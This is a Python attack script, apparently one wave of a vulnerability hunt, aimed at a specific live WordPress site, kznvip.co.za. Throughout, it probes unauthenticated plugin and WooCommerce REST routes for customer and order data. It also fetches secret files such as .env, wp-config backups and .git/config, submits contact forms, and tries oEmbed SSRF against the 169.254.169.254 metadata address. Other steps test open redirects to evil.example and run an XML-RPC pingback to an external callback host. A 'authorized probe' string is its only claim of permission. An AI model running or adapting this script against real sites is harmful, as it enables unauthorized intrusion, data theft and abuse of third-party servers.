#!/usr/bin/env python3
"""Wave12: MWAI routes, Jetpack, trx_addons, sensitive files, CF7 from pages, OOB pingback alt."""
from __future__ import annotations

import json
import re
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
from pathlib import Path

TARGET = "https://kznvip.co.za"
PROXY = None  # set via env PROXY=http://host:port
OUT = Path("artifacts")
OUT.mkdir(exist_ok=True)
Path("out").mkdir(exist_ok=True)

R = {"ts": time.time(), "confirmed": [], "leads": [], "probes": {}}


def opener():
    if PROXY:
        return urllib.request.build_opener(urllib.request.ProxyHandler({"http": PROXY, "https": PROXY}))
    return urllib.request.build_opener()


def http(method, url, data=None, headers=None, timeout=45):
    h = {"User-Agent": "Mozilla/5.0 lurksek-wave12", "Accept": "*/*"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=data, headers=h, method=method)
    t0 = time.time()
    try:
        with opener().open(req, timeout=timeout) as r:
            return r.status, time.time() - t0, r.read(), dict(r.headers)
    except urllib.error.HTTPError as e:
        body = e.read() if hasattr(e, "read") else str(e).encode()
        return e.code, time.time() - t0, body, dict(getattr(e, "headers", {}) or {})
    except Exception as e:
        return 0, time.time() - t0, str(e).encode(), {}


def probe(name, method, path, data=None, headers=None, timeout=45):
    url = path if path.startswith("http") else TARGET + path
    code, t, body, hdrs = http(method, url, data=data, headers=headers, timeout=timeout)
    text = body.decode("utf-8", "replace")[:1200]
    R["probes"][name] = {"code": code, "time": round(t, 3), "body": text[:800], "len": len(body)}
    print(f"{name}: {code} t={t:.2f} len={len(body)} {text[:80]!r}", flush=True)
    return code, t, body, hdrs, text


# nonce from homepage
_, _, body, _, _ = probe("home", "GET", "/")
html = R["probes"]["home"]["body"]
nonces = re.findall(r'"nonce"\s*:\s*"([a-f0-9]{8,12})"', html)
nonce = nonces[0] if nonces else None
R["nonce"] = nonce
auth = {"Accept": "application/json", "X-WP-Nonce": nonce} if nonce else {"Accept": "application/json"}

# --- 1) MWAI / MWAI-UI route sweep ---
mwai_paths = [
    ("GET", "/wp-json/mwai-ui/v1/files"),
    ("GET", "/wp-json/mwai-ui/v1/discussions"),
    ("POST", "/wp-json/mwai-ui/v1/chat"),
    ("POST", "/wp-json/mwai-ui/v1/simpleChatbotQuery"),
    ("POST", "/wp-json/mwai-ui/v1/ai/completions"),
    ("POST", "/wp-json/mwai/v1/chat"),
    ("POST", "/wp-json/mwai/v1/ai/completions"),
    ("GET", "/wp-json/mwai/v1/discussions"),
    ("POST", "/wp-json/mwai/v1/simpleChatbotQuery"),
    ("GET", "/wp-json/mwai-ui/v1/settings"),
    ("GET", "/wp-json/mwai/v1/settings"),
]
for method, path in mwai_paths:
    payload = None
    hdrs = dict(auth)
    if method == "POST":
        payload = json.dumps({"message": "hello", "botId": "default", "context": []}).encode()
        hdrs["Content-Type"] = "application/json"
    code, _, _, _, text = probe(f"mwai_{path.split('/')[-1]}", method, path, data=payload, headers=hdrs)
    if code == 200 and "rest_no_route" not in text and "forbidden" not in text.lower():
        if "chat" in path or "completions" in path:
            R["leads"].append({"type": "mwai_unauth_chat", "path": path, "body": text[:400]})
        elif "discussions" in path:
            R["leads"].append({"type": "mwai_discussions_leak", "path": path, "body": text[:400]})

# --- 2) Jetpack ---
for path in [
    "/wp-json/jetpack/v4/connection/data",
    "/wp-json/jetpack/v4/site/benefits",
    "/wp-json/jetpack/v4/module/all",
    "/wp-json/jetpack/v4/settings",
    "/wp-json/jetpack/v4/sync/spawn-sync",
]:
    code, _, _, _, text = probe(f"jetpack_{path.split('/')[-1]}", "GET", path, headers=auth)
    if code == 200 and "forbidden" not in text.lower() and "rest_no_route" not in text:
        R["leads"].append({"type": "jetpack_unauth", "path": path, "body": text[:400]})

# --- 3) trx_addons ---
for path in [
    "/wp-json/trx_addons/v1/get/sc_layout",
    "/wp-json/trx_addons/v1/get/widget",
    "/wp-json/trx_addons/v1/get/sc_param_group",
]:
    code, _, _, _, text = probe(f"trx_{path.split('/')[-1]}", "GET", path, headers=auth)
    if code == 200 and len(text) > 10:
        R["leads"].append({"type": "trx_unauth", "path": path, "body": text[:400]})

# --- 4) mc4wp newsletter abuse ---
for path in [
    "/wp-json/mc4wp/v1/form",
    "/wp-json/mc4wp/v1/subscriptions",
]:
    code, _, _, _, text = probe(f"mc4wp_{path.split('/')[-1]}", "GET", path, headers=auth)
    if code == 200:
        R["leads"].append({"type": "mc4wp_exposed", "path": path, "body": text[:400]})

# --- 5) CF7 form IDs from pages ---
cf7_ids = set(re.findall(r'wpcf7-f(\d+)-', html))
for slug in ["contacts", "contact-us", "contact", "securityold"]:
    code, _, _, _, page_html = probe(f"page_{slug}", "GET", f"/{slug}/")
    if code == 200:
        cf7_ids.update(re.findall(r'wpcf7-f(\d+)-', page_html))
        cf7_ids.update(re.findall(r'data-id="(\d+)"', page_html))
R["cf7_ids"] = sorted(cf7_ids, key=int)
for fid in sorted(cf7_ids, key=int)[:8]:
    boundary = "----W12" + uuid.uuid4().hex[:6]
    parts = []
    for k, v in [
        ("_wpcf7", str(fid)),
        ("_wpcf7_version", "5.8.5"),
        ("_wpcf7_locale", "en_US"),
        ("your-name", "securitytest"),
        ("your-email", "sec-test@example.com"),
        ("your-message", "authorized probe"),
    ]:
        parts.append(
            f'--{boundary}\r\nContent-Disposition: form-data; name="{k}"\r\n\r\n{v}\r\n'.encode()
        )
    parts.append(f"--{boundary}--\r\n".encode())
    code, _, _, _, text = probe(
        f"cf7m_{fid}",
        "POST",
        f"/wp-json/contact-form-7/v1/contact-forms/{fid}/feedback",
        data=b"".join(parts),
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
    )
    if code in (200, 201) and "mail_sent" in text:
        R["confirmed"].append({"type": "cf7_unauth_email", "form_id": fid, "body": text[:300]})
    elif code in (200, 201) and "validation" not in text.lower():
        R["leads"].append({"type": "cf7_response", "form_id": fid, "body": text[:300]})

# --- 6) Sensitive paths ---
sensitive = [
    "/.env", "/wp-config.php.bak", "/wp-config.bak", "/debug.log",
    "/wp-content/debug.log", "/.git/config", "/backup.zip", "/wp-content/uploads/",
    "/wp-content/uploads/mwai/", "/readme.html", "/license.txt",
    "/wp-json/wp/v2/settings", "/wp-json/wp/v2/plugins",
    "/?rest_route=/wp/v2/settings", "/wp-json/wp-site-health/v1/tests/background-updates",
]
for path in sensitive:
    code, _, _, hdrs, text = probe(f"sens_{path.replace('/', '_')[:40]}", "GET", path)
    if code == 200:
        if path.endswith("debug.log") or ".env" in path or "wp-config" in path:
            R["confirmed"].append({"type": "sensitive_file", "path": path, "body": text[:500]})
        elif path.endswith("/") and ("Index of" in text or "Parent Directory" in text):
            R["confirmed"].append({"type": "directory_listing", "path": path, "body": text[:500]})
        elif "settings" in path and "title" in text:
            R["leads"].append({"type": "settings_leak", "path": path, "body": text[:400]})

# --- 7) WooCommerce IDOR / store ---
for path in [
    "/wp-json/wc/store/v1/products?per_page=5",
    "/wp-json/wc/v3/orders/1",
    "/wp-json/wc/v3/customers/1",
    "/wp-json/wc/v3/coupons?code=test",
    "/wp-json/wc-analytics/orders/1",
    "/wp-json/wc-analytics/reports/orders",
    "/wp-json/wc/store/v1/checkout",
]:
    code, _, _, _, text = probe(f"wc_{path.split('/')[-1][:20]}", "GET", path, headers=auth)
    if code == 200 and any(x in text for x in ["billing", "email", "order_key", "customer_id"]):
        R["confirmed"].append({"type": "wc_data_leak", "path": path, "body": text[:400]})

# --- 8) oEmbed SSRF probe ---
ssrf_url = "http://169.254.169.254/latest/meta-data/"
code, _, _, _, text = probe(
    "oembed_ssrf",
    "GET",
    f"/wp-json/oembed/1.0/proxy?url={urllib.parse.quote(ssrf_url)}",
    headers=auth,
)
if code == 200 and ("ami-" in text or "meta-data" in text):
    R["confirmed"].append({"type": "oembed_ssrf", "body": text[:400]})

# --- 9) Open redirect ---
for url in [
    "/wp-login.php?redirect_to=https://evil.example/",
    "/wp-login.php?redirect_to=//evil.example/",
    "/?redirect_to=https://evil.example",
]:
    code, _, _, hdrs, _ = probe(f"oredir_{hash(url)}", "GET", url)
    loc = hdrs.get("Location") or hdrs.get("location", "")
    R["probes"][f"oredir_{hash(url)}"]["location"] = loc
    if "evil.example" in loc:
        R["confirmed"].append({"type": "open_redirect", "url": url, "location": loc})

# --- 10) OOB pingback via pipedream (no auth) ---
try:
    pd_code, _, pd_body, _, _ = probe("pipedream_create", "POST", "https://pipedream.com/api/v1/sources", timeout=20)
except Exception:
    pass

# Use oast.me style - requestcatcher alternative: webhook via beeceptor free
wh_sub = uuid.uuid4().hex[:12]
wh_url = f"https://{wh_sub}.free.beeceptor.com/pingback"
R["probes"]["beeceptor"] = {"url": wh_url}
for tgt in [f"{TARGET}/", f"{TARGET}/about-us/"]:
    xml = (
        '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName>'
        f"<params><param><value><string>{wh_url}</string></value></param>"
        f"<param><value><string>{tgt}</string></value></param></params></methodCall>"
    ).encode()
    code, t, b, _, txt = probe(
        f"pingback_{tgt.split('/')[-2] or 'root'}",
        "POST",
        "/xmlrpc.php",
        data=xml,
        headers={"Content-Type": "text/xml"},
        timeout=60,
    )
    fc = re.search(r"faultCode.*?<int>(-?\d+)</int>", txt, re.S)
    fs = re.search(r"faultString.*?<string>([^<]*)</string>", txt, re.S)
    R["probes"][f"pingback_{tgt.split('/')[-2] or 'root'}"]["faultCode"] = fc.group(1) if fc else None
    R["probes"][f"pingback_{tgt.split('/')[-2] or 'root'}"]["faultString"] = fs.group(1) if fs else None

time.sleep(6)
code, _, b, _, wh_text = probe("beeceptor_check", "GET", f"https://{wh_sub}.free.beeceptor.com/api/requests", timeout=20)
if code == 200 and ("pingback" in wh_text.lower() or "xmlrpc" in wh_text.lower() or len(wh_text) > 50):
    R["confirmed"].append({"type": "xmlrpc_pingback_ssrf_oob", "callback": wh_url, "hits": wh_text[:500]})

# --- 11) User registration / author enum ---
code, _, _, _, text = probe("users_enum", "GET", "/wp-json/wp/v2/users?per_page=100")
if code == 200:
    try:
        users = json.loads(text if len(text) < 800 else R["probes"]["users_enum"]["body"])
        if isinstance(users, list) and users:
            for u in users:
                if u.get("yoast_head") or u.get("meta"):
                    R["leads"].append({"type": "user_meta_leak", "id": u.get("id"), "keys": list(u.keys())[:20]})
    except Exception:
        pass

# --- 12) MWAI upload list/delete escalation ---
if nonce:
    code, _, _, _, text = probe("mwai_upload_list", "GET", "/wp-json/mwai-ui/v1/files", headers=auth)
    if code == 200 and ("url" in text or "files" in text):
        R["leads"].append({"type": "mwai_file_list", "body": text[:400]})

for p in (OUT / "hunt_wave12.json", Path("out/hunt_wave12.json")):
    p.write_text(json.dumps(R, indent=2, default=str))
print("DONE confirmed", len(R["confirmed"]), "leads", len(R["leads"]), flush=True)
